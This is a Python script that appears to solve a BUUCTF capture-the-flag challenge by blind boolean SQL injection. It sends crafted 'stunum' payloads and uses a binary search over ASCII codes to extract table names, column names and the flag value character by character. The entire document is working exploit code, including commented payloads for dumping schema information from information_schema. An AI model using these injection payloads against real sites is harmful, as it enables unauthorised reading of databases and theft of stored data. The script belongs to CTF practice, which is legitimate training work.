import requests

url = 'http://57e002cb-19bd-4ceb-bc2a-6960ff6347ac.node3.buuoj.cn/index.php'
flag = ''

for i in range(50):
    a = 32
    b = 128
    mid = (a + b) // 2
    while (a < b):

        #stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)   爆表名

        #stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))>0)  爆列名

        payload = url + "?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))>%d)" % (i, mid)
        # %d这里是传值进来 两个%d一个对应i，一个对应mid
        re = requests.get(url=payload)
        if 'admin' in re.text:
            a = mid + 1
        else:
            b = mid
        mid = (a + b) // 2

    if (mid == 32 | mid == 128):
        break

    flag += chr(mid)
    print(flag)